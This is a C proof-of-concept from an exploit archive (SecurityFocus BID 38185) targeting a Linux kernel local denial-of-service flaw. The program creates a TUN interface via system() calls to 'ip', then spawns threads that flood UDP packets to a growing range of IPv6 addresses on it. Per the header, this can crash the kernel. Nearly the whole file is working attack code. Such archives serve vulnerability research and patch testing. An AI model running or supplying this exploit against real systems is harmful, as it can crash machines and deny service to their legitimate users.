/*
source: http://www.securityfocus.com/bid/38185/info

The Linux kernel is prone to a local denial-of-service vulnerability.

Attackers can exploit this issue to crash the affected kernel, denying service to legitimate users. Given the nature of this issue, attackers may also be able to execute arbitrary code, but this has not been confirmed.
*/


/* gcc -std=gnu99 -O2 -g -lpthread -lrt tunload.c -o tunload */

/*****************************************************************************
 * Copyright (C) 2008  Remi Denis-Courmont.  All rights reserved.            *
 *                                                                           *
 * Redistribution and use in source and binary forms, with or without        *
 * modification, are permitted provided that the above copyright notice is   *
 * retained and/or reproduced in the documentation provided with the         *
 * distribution.                                                             *
 *                                                                           *
 * To the extent permitted by law, this software is provided  with no        *
 * express or implied warranties of any kind.                                *
 * The situation as regards scientific and technical know-how at the time    *
 * when this software was distributed did not enable all possible uses to be *
 * tested and verified, nor for the presence of any or all faults to be      *
 * detected. In this respect, people's attention is drawn to the risks       *
 * associated with loading, using, modifying and/or developing and           *
 * reproducing this software.                                                *
 * The user shall be responsible for verifying, by any or all means, the     *
 * software's suitability for its requirements, its due and proper           *
 * functioning, and for ensuring that it shall not cause damage to either    *
 * persons or property.                                                      *
 *                                                                           *
 * The author does not warrant that this software does not infringe any or   *
 * all intellectual right relating to a patent, a design or a trademark.     *
 * Moreover, the author shall not hold someone harmless against any or all   *
 * proceedings for infringement that may be instituted in respect of the     *
 * use, modification and redistrbution of this software.                     *
 *****************************************************************************/

#define _GNU_SOURCE 1

#include <stdio.h>
#include <string.h>
#include <stdarg.h>
#include <stdlib.h>
#include <stdint.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <netinet/in.h>
#include <linux/if.h>
#include <linux/if_tun.h>
#include <pthread.h>

static void run (const char *fmt, ...)
{
	va_list ap;
	char *cmd;

	va_start (ap, fmt);
	vasprintf (&cmd, fmt, ap);
	va_end (ap);

	system (cmd);
	free (cmd);
}

static int tun_open (void)
{
	struct ifreq req;

	int fd = open ("/dev/net/tun", O_RDWR);
	if (fd == -1)
		return -1;

	memset (&req, 0, sizeof (req));
	req.ifr_flags = IFF_TUN;
	if (ioctl (fd, TUNSETIFF, &req))
	{
		(void) close (fd);
		return -1;
	}

	run ("ip link set dev %s up", req.ifr_name);
	run ("ip -6 address add fd34:5678:9abc:def0::1/64 dev %s",
		req.ifr_name);
	return fd;
}

static unsigned rcvd;
static int tun;

static void cleanup_fd (void *data)
{
	(void) close ((intptr_t)data);
}

static void *thread (void *data)
{
	unsigned n = (uintptr_t)data;
	struct sockaddr_in6 dst;
	uint16_t tunhead[2];

        int fd = socket (PF_INET6, SOCK_DGRAM, 0);

        pthread_cleanup_push (cleanup_fd, (void *)(intptr_t)fd);
	memset (&dst, 0, sizeof (dst));
	dst.sin6_family = AF_INET6;
	dst.sin6_addr.s6_addr32[0] = htonl (0xfd345678);
	dst.sin6_addr.s6_addr32[1] = htonl (0x9ABCDEF0);
	dst.sin6_addr.s6_addr32[2] = htonl (0);
	dst.sin6_port = htons (53);

	__sync_fetch_and_and (&rcvd, 0);
	for (;;)
	{
		dst.sin6_addr.s6_addr32[3] =
			__sync_fetch_and_add (&rcvd, 1) % n;
		sendto (fd, NULL, 0, 0,
			(struct sockaddr *)&dst, sizeof (dst));
		read (tun, tunhead, 4);
	}
	pthread_cleanup_pop (0);
}


int main (void)
{
	setvbuf (stdout, NULL, _IONBF, 0);

	tun = tun_open ();
	if (tun == -1)
	{
		perror ("Error");
		return 1;
	}

	for (uintptr_t n = 1; n <= (1 << 20); n *= 2)
	{
		struct timespec ts = { 1, 0, };
		pthread_t th;

		printf ("%6ju: ", (uintmax_t)n);
		pthread_create (&th, NULL, thread, (void *)n);
		clock_nanosleep (CLOCK_MONOTONIC, 0, &ts, NULL);
		pthread_cancel (th);
		pthread_join (th, NULL);
		__sync_synchronize ();
		printf ("%12u\n", rcvd);
	}

	close (tun);
	return 0;
}